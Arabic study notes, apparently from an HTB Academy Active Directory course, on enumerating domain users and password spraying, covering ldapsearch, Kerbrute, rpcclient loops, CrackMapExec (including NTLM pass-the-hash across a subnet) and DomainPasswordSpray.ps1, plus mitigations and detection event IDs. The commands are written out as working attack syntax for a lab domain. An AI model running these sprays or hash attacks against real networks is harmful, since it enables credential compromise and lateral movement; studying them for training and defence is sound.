لأن الـ Password Policy بتقول مثلاً:

```
Reset Counter After

30 Minutes
```

يبقى تعرف العداد لسه موجود.

ولا رجع صفر.

---

## نقطة مهمة جدًا

لو فيه أكتر من Domain Controller.

كل واحد بيحتفظ بـ

```
badpwdcount
```

بشكل منفصل.

---

وده معناه.

إنك لو سألت DC واحد.

مش شرط يكون عنده العدد الحقيقي.

---

## الحل

إما:

تسأل كل Domain Controller.

---

أو

تسأل الـ

```
PDC Emulator
```

لأنه المرجع الأساسي للحسابات داخل الدومين.

---

## ملخص الجزء

بعد الجزء ده بقينا نعرف:

- إزاي نبني Target User List.
- ليه Password Policy لازم تتعرف الأول.
- ليه لازم نوثق كل محاولة.
- إزاي نجيب Users باستخدام enum4linux.
- إزاي نجيب Users باستخدام rpcclient.
- إزاي CrackMapExec بيعرض Users بالإضافة إلى badpwdcount و baddpwdtime، وازاي المعلومات دي بتساعدنا نتجنب Lockout قبل تنفيذ Password Spraying.

## Gathering Users with LDAP Anonymous

بعد ما عرفنا إزاي نجيب Users باستخدام SMB NULL Session.

في طريقة تانية اسمها:

**LDAP Anonymous Bind**

ودي بتعتمد على إن السيرفر يسمح لأي شخص يعمل Query على الـ LDAP بدون Username أو Password.

---

## يعني إيه LDAP؟

LDAP اختصار:

**Lightweight Directory Access Protocol**

وده البروتوكول اللي Active Directory بيستخدمه علشان يخزن ويسترجع معلومات عن:

- Users
- Groups
- Computers
- Organizational Units (OU)
- Password Policies

بمعنى إن أي عملية بحث داخل الـ Active Directory غالبًا بتتم باستخدام LDAP.

---

## يعني إيه Anonymous Bind؟

كلمة Bind في LDAP معناها:

"تعمل Login أو Connection مع السيرفر."

لكن هنا Anonymous Bind يعني:

تعمل اتصال **بدون Authentication**.

يعني:

- Username = فارغ
- Password = فارغ

لو السيرفر سمح بده، تقدر تقرأ بيانات كتير من الـ Active Directory.

---

## الأدوات المستخدمة

الدرس ذكر أداتين:

- ldapsearch
- windapsearch

---

## ldapsearch

الأمر:

```bash
ldapsearch \
-h 172.16.5.5 \
-x \
-b "DC=INLANEFREIGHT,DC=LOCAL" \
-s sub \
"(&(objectclass=user))"
```

---

## نشرح الأمر بالكامل

### ldapsearch

أداة موجودة غالبًا في Linux.

بتستخدم لإرسال استعلامات (Queries) إلى LDAP Server.

---

### -h

```bash
-h 172.16.5.5
```

يعني:

عنوان الـ Domain Controller.

---

### -x

يعني:

استخدم Simple Authentication.

وفي الحالة دي بما إننا مش مديين Username أو Password.

يبقى هيحاول يعمل Anonymous Bind.

---

### -b

```bash
-b "DC=INLANEFREIGHT,DC=LOCAL"
```

دي اسمها:

**Base DN**

---

## يعني إيه Base DN؟

هي النقطة اللي هيبدأ منها البحث.

لو الدومين:

```
INLANEFREIGHT.LOCAL
```

يبقى الـ Base DN بيكون:

```
DC=INLANEFREIGHT,DC=LOCAL
```

---

### -s sub

اختصار:

Subtree.

يعني:

ابحث في كل الفروع.

مش في الـ Root بس.

---

### "(&(objectclass=user))"

ده اسمه:

LDAP Search Filter.

---

## يعني إيه Search Filter؟

هو الشرط اللي بقوله للسيرفر.

هنا الشرط هو:

```
هات أي Object
نوعه User
```

يعني متجبليش:

- Groups
- Computers
- Printers

هات المستخدمين فقط.

---

## بعد كده

الأمر بيستخدم

```bash
grep
```

---

```bash
grep sAMAccountName:
```

---

## sAMAccountName

ده أهم Attribute خاص باليوزر.

وهو الـ Username.

مثلاً:

```
Administrator

Ahmed

Mohab
```

---

بعدها

```bash
cut
```

علشان يطلع اسم المستخدم فقط.

---

## الناتج

```text
guest

ACADEMY-EA-DC01$

ACADEMY-EA-MS01$

ACADEMY-EA-WEB01$

htb-student

avazquez
```

---

## ليه فيه أسماء بتنتهي بـ $

زي:

```
ACADEMY-EA-DC01$
```

دي مش Users.

دي Computer Accounts.

---

في Active Directory.

كل جهاز ليه Account.

وبيكون آخره علامة:

```
$
```

زي:

```
PC01$

SERVER01$

WEB01$
```

---

## windapsearch

الدرس قال إن استخدام ldapsearch محتاج تعرف LDAP Filters.

لكن windapsearch أسهل.

---

الأمر

```bash
./windapsearch.py \
--dc-ip 172.16.5.5 \
-u "" \
-U
```

---

## نشرح

### --dc-ip

IP بتاع الـ Domain Controller.

---

### -u ""

Username فارغ.

علشان Anonymous Bind.

---

### -U

يعني:

اعرض المستخدمين فقط.

Users Only.

---

## الناتج

```text
Attempting bind

success!
```

---

وده معناه

إن Anonymous Bind اشتغل.

---

بعدها

```text
Enumerating all AD users
```

يعني:

هيبدأ يجيب كل المستخدمين.

---

مثلاً

```text
cn: Annie Vazquez
```

---

## cn

اختصار:

Common Name.

وده الاسم الكامل.

---

بعدها

```text
userPrincipalName
```

---

## userPrincipalName

ده اسم المستخدم الكامل.

مثلاً

```
avazquez@inlanefreight.local
```

وده غالبًا بيستخدم أثناء تسجيل الدخول.

---

## Enumerating Users with Kerbrute

دلوقتي نفترض إن:

- مفيش NULL Session.
- مفيش LDAP Anonymous.
- معندكش Credentials.

نعمل إيه؟

---

هنا بنستخدم:

Kerbrute.

---

## Kerbrute

أداة بتستخدم بروتوكول:

Kerberos.

علشان تعرف إذا كان Username موجود ولا لأ.

---

## أهم ميزة

إنها أسرع جدًا.

وكمان أقل ضوضاء (Stealthier).

---

## ليه؟

لأنها مش بتحاول تعمل Login بالطريقة التقليدية.

---

هي بتبعت

TGT Request

للـ KDC.

---

## يعني إيه TGT؟

TGT اختصار:

**Ticket Granting Ticket**

وده أول Ticket المستخدم بياخده لما يعمل Login باستخدام Kerberos.

---

## KDC

اختصار:

Key Distribution Center.

وده جزء من الـ Domain Controller مسؤول عن Kerberos Authentication.

---

## Kerberos Pre-Authentication

الدرس ذكر نقطة مهمة جدًا.

Kerbrute بيبعت طلب بدون Pre-Authentication.

---

لو الـ KDC رد:

```
PRINCIPAL UNKNOWN
```

يبقى

الـ Username غير موجود.

---

أما لو قال:

```
هات Kerberos Pre-Authentication
```

يبقى

اليوزر موجود.

---

## ليه الطريقة دي مميزة؟

لأنها:

لا تعتبر Login Failure.

وبالتالي

مش بتطلع Event ID

```
4625
```

---

## Event ID 4625

ده Event بيتسجل لما:

حد يحاول يعمل Login ويفشل.

وده الـ SOC أو الـ SIEM بيراقبه غالبًا.

---

## لكن هل Kerbrute Invisible؟

لا.

---

هو بيطلع Event مختلف.

اسمه

```
4768
```

---

## Event ID 4768

يعني:

تم طلب Ticket من Kerberos.

---

وده بيظهر فقط.

لو الشركة مفعلة:

Kerberos Logging.

---

## الأمر

```bash
kerbrute userenum \
-d inlanefreight.local \
--dc 172.16.5.5 \
/opt/jsmith.txt
```

---

## نشرح

### userenum

يعني:

اعمل Username Enumeration.

---

### -d

اسم الدومين.

---

### --dc

IP بتاع الـ Domain Controller.

---

### /opt/jsmith.txt

Wordlist.

فيها آلاف الـ Usernames المحتملة.

---

## الناتج

```text
VALID USERNAME:

jjones

sbrown

tjohnson
```

---

يعني

كل دول موجودين داخل الـ Active Directory.

---

## سرعة Kerbrute

الدرس ذكر مثال.

فحص:

```
48,705 Username
```

في حوالي:

```
12 ثانية
```

وده سريع جدًا.

---

## هل الطريقة دي بتقفل الحسابات؟

أثناء Username Enumeration

لا.

---

لكن

لو استخدمت Kerbrute بعد كده في Password Spraying.

يبقى أي Password غلط.

هيتحسب ضمن:

```
badpwdcount
```

وممكن يقفل الحساب.

---

## لو معرفتش تجيب Users بأي طريقة؟

الكاتب قال.

ارجع لـ OSINT.

---

زي:

- LinkedIn
- Email Harvesting
- أسماء الموظفين على الموقع الرسمي
- أدوات مثل linkedin2username لتوليد أسماء مستخدمين محتملة بناءً على أسماء الموظفين.

---

## Credentialed Enumeration

لو معاك Username و Password صحيحين.

يبقى الموضوع أسهل بكتير.

---

الأمر:

```bash
crackmapexec smb 172.16.5.5 \
-u htb-student \
-p Academy_student_AD! \
--users
```

---

## الفرق بينه وبين اللي فات

المرة اللي فاتت استخدمنا:

```
--users
```

بدون Credentials.

---

المرة دي

بنستخدم User حقيقي.

---

وده بيدينا معلومات أدق.

زي:

```text
badpwdcount
```

---

و

```text
baddpwdtime
```

لكل User.

---

مثلاً

```text
avazquez

badpwdcount : 20
```

---

وده معناه.

المستخدم غلط 20 مرة.

---

ولو الـ Lockout Threshold

5

يبقى ده حساب لازم تتجنبه تمامًا أثناء الـ Password Spraying، لأن أي محاولة إضافية قد تؤدي إلى قفله إذا كانت العداد لم يتم إعادة تعيينه وفقًا للـ Password Policy.

---

## ملخص الجزء

بعد الجزء ده بقينا نعرف:

- إزاي نستخدم LDAP Anonymous Bind لجمع المستخدمين.
- الفرق بين ldapsearch و windapsearch.
- معنى Base DN و LDAP Search Filter و sAMAccountName.
- ليه Computer Accounts بتنتهي بعلامة `$`.
- إزاي Kerbrute بيكتشف اليوزرز باستخدام Kerberos.
- الفرق بين Event ID 4625 و Event ID 4768.
- إمتى Kerbrute آمن، وإمتى ممكن يسبب Account Lockout.
- إزاي نستخدم CrackMapExec مع Credentials للحصول على قائمة مستخدمين ومعلومات تساعدنا قبل تنفيذ Password Spraying.

# Layer 11
## Internal Password Spraying - from Linux

بعد ما جمعنا:

- قائمة المستخدمين (User List)
- وعرفنا الـ Password Policy

يبقى جاهزين ننفذ **Password Spraying**.

الدرس هنا بيشرح إزاي تعمل الهجوم من جهاز Linux.

---

## يعني إيه Internal Password Spraying؟

يعني أنت بالفعل موجود داخل شبكة الشركة.

مش بتهاجم من الإنترنت.

يعني مثلاً:

- على جهاز Kali داخل الشركة.
- أو واخد Shell على جهاز Linux.
- أو داخل VPN الخاصة بالشركة.

ومن هناك تبدأ تجرب Password واحد على كل المستخدمين.

---

## ليه لازم نمشي بحذر؟

الكاتب أكد على النقطة دي.

لأن أي Password غلط بيتحسب.

ولو عديت الـ Lockout Threshold.

الحسابات هتتقفل.

وده:

- هيكشف وجودك.
- وهيعمل مشاكل للعميل.
- وهيعتبر تنفيذ سيء للـ Pentest.

---

## Password Spraying باستخدام rpcclient

الكاتب بيقول إن rpcclient يعتبر من أفضل الأدوات لتنفيذ Password Spraying من Linux.

---

## المشكلة في rpcclient

لما الـ Login ينجح.

مش بيقولك:

```
SUCCESS
```

مثلاً.

لا.

بيطلع Output عادي.

فلازم تعرف إيه العلامة اللي تدل إن الـ Login نجح.

---

## علامة نجاح الـ Login

لو ظهر:

```text
Authority Name
```

يبقى Authentication نجح.

---

## الأمر

```bash
for u in $(cat valid_users.txt); do
rpcclient -U "$u%Welcome1" \
-c "getusername;quit" \
172.16.5.5 | grep Authority;
done
```

---

## نشرح الأمر بالكامل

---

### for

```bash
for u
```

دي Loop.

هتلف على كل User.

---

### $(cat valid_users.txt)

يعني:

اقرأ الملف.

مثلاً

```
ahmed

mohab

admin

john
```

---

كل سطر.

هيتحط في المتغير:

```
u
```

---

### rpcclient

الأداة اللي هتعمل Authentication.

---

### -U

```bash
-U "$u%Welcome1"
```

دي أهم جزء.

---

لاحظ الشكل.

```
Username%Password
```

يعني

```
ahmed%Welcome1
```

---

ثم

```
mohab%Welcome1
```

---

ثم

```
admin%Welcome1
```

وهكذا.

---

### -c

```bash
-c
```

يعني:

نفذ Command.

وبعدين اقفل.

---

### getusername

بعد الـ Login.

اسأل السيرفر:

مين اليوزر الحالي؟

---

لو الـ Login نجح.

هيرجع:

اسم المستخدم.

---

### quit

اقفل الاتصال.

---

### grep Authority

فلترة.

يعني:

هات السطور اللي فيها

```
Authority
```

بس.

---

## الناتج

```text
Account Name: tjohnson

Authority Name: INLANEFREIGHT
```

---

وده معناه.

إن Login نجح.

---

لو مفيش Output.

يبقى Password غلط.

---

## ليه grep مهم؟

بدونه.

هتشوف مئات الرسائل.

وممكن تضيع الـ Success وسطها.

---

## Password Spraying باستخدام Kerbrute

الأداة التانية.

هي Kerbrute.

---

## الأمر

```bash
kerbrute passwordspray \
-d inlanefreight.local \
--dc 172.16.5.5 \
valid_users.txt \
Welcome1
```

---

## نشرح

### passwordspray

يعني:

نفذ Password Spraying.

---

### -d

اسم الدومين.

---

### --dc

IP بتاع الـ Domain Controller.

---

### valid_users.txt

ملف المستخدمين.

---

### Welcome1

الباسورد اللي هيتجرب.

---

## الناتج

```text
VALID LOGIN

sgage

Welcome1
```

---

وده معناه.

اليوزر:

```
sgage
```

بيستخدم

```
Welcome1
```

---

بعدها

```text
Done!
```

---

وبيوضح:

- عدد الـ Logins.
- عدد النجاحات.
- الوقت.

---

## CrackMapExec Password Spraying

طريقة تالتة.

---

الأمر

```bash
sudo crackmapexec smb \
172.16.5.5 \
-u valid_users.txt \
-p Password123
```

---

## نشرح

### smb

هنجرب Authentication باستخدام SMB.

---

### -u

بدل User واحد.

اديناله File.

---

كل User.

هيتجرب عليه Password واحدة.

---

### -p

الباسورد.

---

## grep +

بعدها

```bash
grep +
```

---

ليه؟

لأن CrackMapExec بيطلع Output لكل User.

---

لكن.

الـ Success.

بيكون فيه

```
[+]
```

---

فالفلترة دي.

بتطلع النجاحات فقط.

---

## الناتج

```text
[+]

avazquez

Password123
```

---

وده معناه.

اليوزر.

Password بتاعه صحيحة.

---

## التحقق من الـ Credentials

بعد ما تلاقي Password صحيحة.

لا تعتمد على نتيجة الـ Spray فقط.

---

اعمل Validation.

---

الأمر

```bash
crackmapexec smb \
172.16.5.5 \
-u avazquez \
-p Password123
```

---

## الهدف

نتأكد إن:

- Username صحيح.
- Password صحيحة.
- Authentication شغال.

---

لو ظهر

```text
[+]
```

يبقى Credentials صحيحة.

---

## Local Administrator Password Reuse

الدرس بعد كده دخل في نقطة مهمة جدًا.

---

## هل Password Spraying بيكون على Domain Users فقط؟

لا.

---

ممكن كمان.

تجربه على:

Local Administrator.

---

## يعني إيه Local Administrator؟

كل جهاز Windows.

فيه Administrator خاص بيه.

---

وده مختلف عن:

```
Domain Administrator
```

---

## المشكلة الكبيرة

شركات كتير.

بتستخدم نفس Password.

على كل الأجهزة.

---

مثلاً.

كل الأجهزة.

Password بتاع الـ Administrator فيها

```
Admin@123
```

---

لو عرفت Password جهاز واحد.

يبقى غالبًا.

هتدخل باقي الأجهزة.

---

## ليه المشكلة دي موجودة؟

بسبب

Gold Images.

---

## يعني إيه Gold Image؟

هي نسخة Windows جاهزة.

الشركة بتعمل منها Clone.

على كل الأجهزة.

---

لو النسخة فيها:

```
Administrator

Password123
```

---

يبقى كل الأجهزة.

هيكون فيها نفس Password.

---

## CrackMapExec

بيقدر يجرب نفس الـ Password.

على كل الأجهزة.

---

## الأجهزة المهمة

الكاتب قال.

ركز على:

- SQL Servers
- Exchange Servers

---

## ليه؟

لأن غالبًا.

هيكون عليهم:

- Admins.
- Service Accounts.
- Credentials في الذاكرة.

---

## إعادة استخدام Passwords

مثلاً.

لقيت

```
desktop%@admin123
```

على جهاز Desktop.

---

جرب

```
server%@admin123
```

على السيرفرات.

---

لأن الشركات أحيانًا بتغير جزء بسيط فقط من كلمة السر حسب نوع الجهاز.

---

## نفس الفكرة مع المستخدمين

مثلاً.

عرفت Password المستخدم:

```
ajones
```

---

جربها على:

```
ajones_adm
```

---

لأن بعض الشركات بتدي نفس الشخص:

- User Account
- Admin Account

بنفس Password.

---

## Domain Trust

ممكن كمان.

يبقى فيه:

Domain A

و

Domain B

---

ونفس المستخدم.

بيستخدم نفس Password.

في الاتنين.

---

## NTLM Hash

أحيانًا.

مش هتعرف Password.

---

لكن هتعرف:

NTLM Hash.

---

## يعني إيه NTLM Hash؟

هو تمثيل مشفر (Hash) لكلمة المرور، ويُستخدم في بعض بروتوكولات المصادقة داخل Windows. بعض الأدوات تستطيع استخدام الـ Hash مباشرة للمصادقة في سيناريوهات معينة بدون معرفة كلمة المرور الأصلية.

---

## الأمر

```bash
sudo crackmapexec smb \
--local-auth \
172.16.5.0/23 \
-u administrator \
-H 88ad09182de639ccc6579eb0849751cf
```

---

## نشرح

### --local-auth

مهمة جدًا.

---

بتقول لـ CrackMapExec.

متستخدمش Domain Authentication.

---

استخدم Local Accounts فقط.

---

وده بيمنع.

إنه يجرب على الدومين.

وبالتالي يقلل خطر قفل حساب Domain Administrator.

---

### 172.16.5.0/23

Network كاملة.

---

يعني.

جرب على كل الأجهزة.

---

### -u administrator

اليوزر المحلي.

---

### -H

بدل Password.

بنستخدم NTLM Hash.

---

## الناتج

```text
(Pwn3d!)
```

---

## يعني إيه Pwn3d! ؟

دي رسالة من CrackMapExec.

معناها:

تم تسجيل الدخول بنجاح.

والحساب عنده صلاحيات Administrator على الجهاز.

---

## بعد كده نعمل إيه؟

نبدأ نفحص الأجهزة.

يمكن نلاقي:

- Credentials.
- ملفات مهمة.
- Session لـ Domain Admin.
- أو أي وسيلة تساعدنا نوصل للدومين.

---

## هل الطريقة دي Stealth؟

لا.

---

الكاتب قال.

الطريقة دي:

**Noisy جدًا.**

---

يعني هتعمل كمية كبيرة من محاولات الاتصال على أجهزة كثيرة، وده ممكن يكون ملحوظ في الـ Logs وأنظمة المراقبة.

---

## علاج المشكلة

الكاتب اقترح استخدام:

**LAPS (Local Administrator Password Solution).**

---

## يعني إيه LAPS؟

أداة مجانية من Microsoft.

بتخلي:

كل جهاز.

له Password مختلفة للـ Local Administrator.

---

وكمان.

بتغيرها تلقائيًا كل فترة.

---

وبالتالي.

حتى لو عرفت Password جهاز.

مش هتدخل أي جهاز تاني.

---

## ملخص الجزء

بعد الجزء ده بقينا نعرف:

- إزاي ننفذ Password Spraying من Linux باستخدام `rpcclient`.
- ليه `Authority Name` دليل على نجاح تسجيل الدخول.
- إزاي نستخدم `Kerbrute` في Password Spraying.
- إزاي نستخدم `CrackMapExec` لتنفيذ الهجوم والتحقق من الـ Credentials.
- يعني إيه Local Administrator Password Reuse وليه يعتبر خطر.
- الفرق بين استخدام Password عادية واستخدام NTLM Hash.
- أهمية `--local-auth` عند تجربة Local Administrator.
- معنى رسالة `Pwn3d!`.
- ليه إعادة استخدام كلمات مرور الـ Local Administrator مشكلة كبيرة، وإزاي LAPS بيعالجها.

# Layer 12
## Internal Password Spraying - from Windows

في الجزء اللي فات اتعلمنا إزاي نعمل Password Spraying من Linux.

دلوقتي هنشوف نفس الفكرة.

لكن من جهاز Windows موجود داخل الدومين.

---

## ليه ننفذ الهجوم من Windows؟

مش لازم كل مرة يكون عندك Kali أو Linux.

ممكن تكون:

- واخد Initial Access على جهاز Windows.
- عندك RDP على جهاز.
- عندك Shell.
- أو العميل بنفسه مديك Windows VM داخل الشبكة.

في الحالة دي.

هنستخدم أدوات Windows.

---

## الأداة المستخدمة

اسمها:

```
DomainPasswordSpray.ps1
```

---

## ليه الأداة دي مميزة؟

لأنها بتعمل حاجات كتير لوحدها.

بدل ما تعملها بإيدك.

---

## الأداة بتعمل إيه؟

لو أنت Logged In على الدومين.

فهتقوم تلقائيًا بـ:

- تجيب كل Users من Active Directory.
- تعرف Password Policy.
- تعرف Lockout Threshold.
- تستبعد الحسابات القريبة من الـ Lockout.
- تنفذ Password Spray.
- تحفظ النتائج في ملف.


![[Pasted image 20260803180333.png]]

---

## لو مش Logged In؟

ممكن تديها:

```
-UserList
```

وتستخدم ملف Users بنفسك.

---

## سيناريوهات استخدام الأداة

الدرس ذكر أكتر من مثال.

---

### الحالة الأولى

أنت داخل على جهاز Domain Joined.

---

### الحالة الثانية

العميل مديك Windows VM.

---

### الحالة الثالثة

أنت موجود داخل الشركة.

On-site.

---

### الحالة الرابعة

خدت Initial Access.

وعايز تحصل على User أقوى.

مثلاً:

من User عادي.

إلى Domain Admin.

---

## تشغيل الأداة

أول خطوة.

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

---

## يعني إيه Import-Module؟

PowerShell فيه حاجة اسمها Modules.

زي Libraries.

---

الأمر ده.

بيحمل السكريبت.

علشان تقدر تستخدم أوامره.

---

بعدها.

```powershell
Invoke-DomainPasswordSpray \
-Password Welcome1 \
-OutFile spray_success \
-ErrorAction SilentlyContinue
```

---

## نشرح الأمر

---

### Invoke-DomainPasswordSpray

الأمر الأساسي.

اللي بينفذ Password Spraying.

---

### -Password

```powershell
Welcome1
```

الباسورد اللي هتتجرب.

---

### -OutFile

```powershell
spray_success
```

احفظ النتائج.

في ملف.

---

### -ErrorAction SilentlyContinue

دي خاصة بـ PowerShell.

---

يعني:

لو فيه Errors.

متظهرهاش.

وكمل تنفيذ.

---

## بداية التنفيذ

```text
Current domain is compatible with Fine-Grained Password Policy
```

---

## يعني إيه Fine-Grained Password Policy؟

في Active Directory.

ممكن يبقى فيه:

Password Policy واحدة.

لكل الناس.

---

أو.

يبقى فيه Policies مختلفة.

حسب نوع المستخدم.

---

مثلاً.

Admins.

ليهم Password Policy.

---

Employees.

ليهم Password Policy تانية.

---

وده اسمه:

Fine-Grained Password Policy.

---

## بعد كده

```text
Now creating a list of users to spray...
```

---

يعني.

الأداة بدأت تجمع المستخدمين.

من Active Directory.

---

## بعدها

```text
Smallest lockout threshold discovered

5
```

---

يعني.

أقل Lockout Threshold.

في الدومين.

هو

5

---

## ليه اختارت أصغر واحد؟

علشان تبقى Safe.

---

لو فيه User.

Threshold بتاعه

5

وغيره

10

---

الأداة هتمشي على

5

علشان متقفلش أي حساب.

---

## بعد كده

```text
Removing disabled users
```

---

يعني.

الحسابات المقفولة.

اتشالت.

---

لأن مفيش فايدة.

تجرب عليها.

---

## بعدها

```text
2923 Users
```

---

يعني.

لقيت

2923

User.

---

## بعدها

```text
Removing users within 1 attempt of locking out
```

---

دي من أذكى مميزات الأداة.

---

مثلاً.

Threshold = 5.

---

وفي User.

عامل

```
badpwdcount = 4
```

---

يبقى.

لو جربت Password واحدة.

الحساب هيتقفل.

---

الأداة.

بتشيله تلقائيًا.

---

## بعد كده

```text
Observation Window
```

---

## يعني إيه Observation Window؟

هي الفترة.

اللي بعدها.

عداد الـ badpwdcount.

يرجع صفر.

---

مثلاً.

```
30 Minutes
```

---

يعني.

لو المستخدم غلط مرتين.

واستنى.

30 دقيقة.

---

العداد يرجع.

0.

---

## بعد كده

```text
Setting wait between sprays
```

---

يعني.

الأداة.

هتستنى.

الفترة المناسبة.

بين كل Password.

علشان تحافظ على الحسابات.

---

## Confirmation

بعدها.

هتسألك.

```text
Are you sure?
```

---

ليه؟

علشان.

متنفذش الهجوم بالغلط.

---

لو كتبت.

```
Y
```

---

هيبدأ.

---

## التنفيذ

```text
Trying Password

Welcome1
```

---

يعني.

هيجرب.

Welcome1.

على كل المستخدمين.

---

## النجاح

```text
SUCCESS

User

sgage

Password

Welcome1
```

---

وده معناه.

لقى User.

بيستخدم الباسورد دي.

---

بعدها.

```text
Writing Successes
```

---

يعني.

بيحفظ كل النتائج.

في الملف.

اللي أنت حددته.

---

## Kerbrute على Windows

الكاتب قال.

ممكن تستخدم.

Kerbrute.

على Windows.

برضو.

---

نفس الأوامر.

اللي استخدمناها على Linux.

---

## Mitigations

بعد ما شرح الهجوم.

بدأ يشرح.

إزاي الشركات تمنعه.

---

## Multi-Factor Authentication

أول حماية.

هي.

MFA.

---

## يعني إيه MFA؟

يعني.

مش Password بس.

---

لازم كمان.

عامل تاني.

زي:

- Google Authenticator.
- رسالة SMS.
- Push Notification.
- RSA Token.

---

## هل MFA يمنع الهجوم؟

غالبًا.

أيوه.

---

لكن.

في نقطة.

الكاتب ذكرها.

---

ممكن.

الـ Username.

والـ Password.

يبقوا صح.

---

لكن.

اللي يمنع الدخول.

هو.

الـ MFA.

---

وده معناه.

إن الـ Credentials نفسها صحيحة.

وممكن المهاجم يجربها على خدمة تانية لا تستخدم MFA.

---

## Restricting Access

يعني.

تدي كل User.

صلاحياته فقط.

---

مثلاً.

موظف HR.

ميقدرش يدخل.

على تطبيق الـ IT.

---

وده اسمه.

Least Privilege.

---

## Least Privilege

يعني.

كل مستخدم.

ياخد أقل صلاحيات.

يحتاجها.

بس.

---

## Reducing Impact

يعني.

حتى لو المهاجم دخل.

يبقى الضرر قليل.

---

إزاي؟

---

### Admin Account منفصل

يبقى.

الموظف.

عنده.

User.

---

وحساب Admin.
  
منفصل.

---

مش نفس الحساب.

---

### Application Permissions

كل برنامج.

له Permissions.

منفصلة.

---

### Network Segmentation

قسم الشبكة.

لأجزاء.

---

بحيث.

لو المهاجم دخل.

جزء.

ميعرفش يوصل.

لكل الشركة.

---

## Password Hygiene

يعني.

ثقافة اختيار Passwords.

---

لازم المستخدمين.

يستخدموا.

Passwords قوية.

---

والشركة.

تمنع.

Passwords المشهورة.

زي.

```
Welcome1

Summer2025

Company123
```

---

وكمان.

تمنع.

اسم الشركة.

داخل Password.

---

## نقطة مهمة جدًا

لو Lockout Policy.

شديدة جدًا.

---

مثلاً.

بعد محاولة واحدة.

الحساب يتقفل.

---

ده ممكن.

يسبب.

Denial of Service.

---

لأن أي حد.

يقدر يقفل.

كل الحسابات.

بسهولة.

---

## Detection

إزاي الشركة تعرف.

إن فيه Password Spraying؟

---

### أول علامة

حسابات كتير.

اتقفلت.

في وقت قصير.

---

### ثاني علامة

محاولات Login.

كتير.

على Users مختلفين.

---

### ثالث علامة

طلبات كتير.

لنفس الموقع.

في وقت قصير.

---

## Event ID 4625

ده أشهر Event.

---

معناه.

```
An account failed to log on
```

---

يعني.

Login Failed.

---

لو ظهر.

مئات المرات.

في وقت قصير.

---

غالبًا.

فيه Password Spraying.

---

## Event ID 4771

ده خاص.

بـ Kerberos.

---

معناه.

```
Kerberos Pre-Authentication Failed
```

---

وده مهم.

لو المهاجم.

بيستخدم LDAP أو Kerberos بدل SMB.

---

لكن.

علشان يظهر.

لازم.

Kerberos Logging.

يبقى Enabled.

---

## External Password Spraying

الدرس قال.

مش داخل المنهج.

لكن ذكره باختصار.

---

## يعني إيه External؟

يعني.

المهاجم.

خارج الشركة.

---

وبيهاجم.

الخدمات.

اللي على الإنترنت.

---

## أشهر الأهداف

### Microsoft 365

حسابات Microsoft السحابية.

---

### Outlook Web Access

تسجيل الدخول للبريد.

---

### Exchange Web Access

واجهة Exchange.

---

### Skype for Business

---

### Lync Server

---

### RDS Portals

بوابات Remote Desktop.

---

### Citrix Portals

---

### VMware Horizon

---

### VPN Portals

زي:

- Fortinet
- SonicWall
- Citrix
- OpenVPN

---

### Custom Web Applications

أي موقع.

بيستخدم.

Active Directory Authentication.

---

## Moving Deeper

بعد ما حصلنا.

على Credentials.

---

المرحلة اللي بعدها.

مش Password Spraying.

---

لكن.

Credentialed Enumeration.

---

يعني.

هنستخدم الـ Credentials.

علشان نستكشف.

الدومين.

بشكل أعمق.

---

ومن هناك.

نبدأ:

- Lateral Movement (الانتقال لأجهزة أخرى بنفس مستوى الصلاحيات).
- Vertical Movement أو Privilege Escalation (الحصول على صلاحيات أعلى داخل الدومين).

---

## ملخص الفصل بالكامل

بعد إنهاء فصل Password Spraying أصبحت تعرف:

- ليه لازم تجمع User List قبل الهجوم.
- أهمية معرفة Password Policy قبل أي محاولة.
- طرق جمع المستخدمين باستخدام SMB وLDAP وKerbrute وCrackMapExec.
- تنفيذ Password Spraying من Linux باستخدام `rpcclient` و`Kerbrute` و`CrackMapExec`.
- تنفيذ Password Spraying من Windows باستخدام `DomainPasswordSpray.ps1`.
- كيفية التحقق من الـ Credentials بعد نجاح الهجوم.
- خطورة إعادة استخدام كلمة مرور الـ Local Administrator وكيفية استغلالها.
- وسائل الحماية مثل MFA وLeast Privilege وLAPS وNetwork Segmentation.
- طرق اكتشاف الهجوم باستخدام Windows Event IDs مثل **4625** و**4771**.
- الفرق بين Internal Password Spraying وExternal Password Spraying.
- أن الخطوة التالية بعد الحصول على حسابات صحيحة هي **Credentialed Enumeration** لاستكشاف بيئة الـ Active Directory بشكل أعمق.


# Layer 13
## Enumerating Security Controls

بعد ما نجحنا ناخد **Foothold** داخل الشبكة (يعني بقينا عندنا وصول مبدئي لجهاز داخل الدومين)، مش بنبدأ نهجم على طول.

أول خطوة ذكية هي إننا نعرف:

**إيه وسائل الحماية الموجودة في الشركة؟**

لأن الأدوات اللي هتستخدمها بعد كده ممكن تشتغل على شركة، وتتفشل أو تتكشف في شركة تانية بسبب وجود وسائل حماية مختلفة.

---

## يعني إيه Security Controls؟

Security Controls هي وسائل الحماية اللي الشركة حطاها علشان تمنع أو تكتشف الهجمات.

زي مثلاً:

- Windows Defender
- AppLocker
- LAPS
- Antivirus
- EDR
- PowerShell Restrictions

---

## ليه نعمل Enumeration للـ Security Controls؟

علشان نعرف:

- هل PowerView هيشتغل؟
- هل PowerShell متقفلة؟
- هل Windows Defender شغال؟
- هل LAPS مفعلة؟
- هل فيه Application Whitelisting؟

كل ده بيساعدك تختار الأداة المناسبة.

---

## Living Off The Land

الكاتب ذكر مصطلح مهم جدًا.

```
Living Off The Land
```

---

## يعني إيه؟

يعني تستخدم الأدوات الموجودة أصلًا داخل Windows.

بدل ما تنزل أدوات خارجية.

---

مثلاً تستخدم:

- cmd
- powershell
- net
- sc
- wmic
- certutil

بدل ما تنزل ملفات جديدة.

---

## ليه؟

لأن الأدوات الموجودة أصلًا:

- أقل لفتًا للانتباه.
- أقل احتمال إنها تتمنع.
- غالبًا الـ Antivirus بيسمح بيها.

---

## نقطة مهمة

مش كل أجهزة الشركة.

بيكون عليها نفس الحماية.

---

مثلاً:

Server.

ممكن يكون عليه AppLocker.

---

لكن.

جهاز موظف.

مفيهوش AppLocker.

---

فلازم تعمل Enumeration لكل جهاز مهم.

---

## Windows Defender

أول وسيلة حماية.

هي.

Windows Defender.

---

## يعني إيه Windows Defender؟

هو Antivirus المدمج مع Windows.

واسمه الجديد:

```
Microsoft Defender
```

---

## بيعمل إيه؟

بيفحص:

- الملفات.
- البرامج.
- الـ Scripts.
- PowerShell.
- الـ Memory.

ويمنع أي حاجة يعتبرها خطر.

---

## مثال

PowerView.

---

PowerView أداة مشهورة جدًا.

في Active Directory Enumeration.

---

في Windows الحديثة.

Defender غالبًا هيمنعها.

---

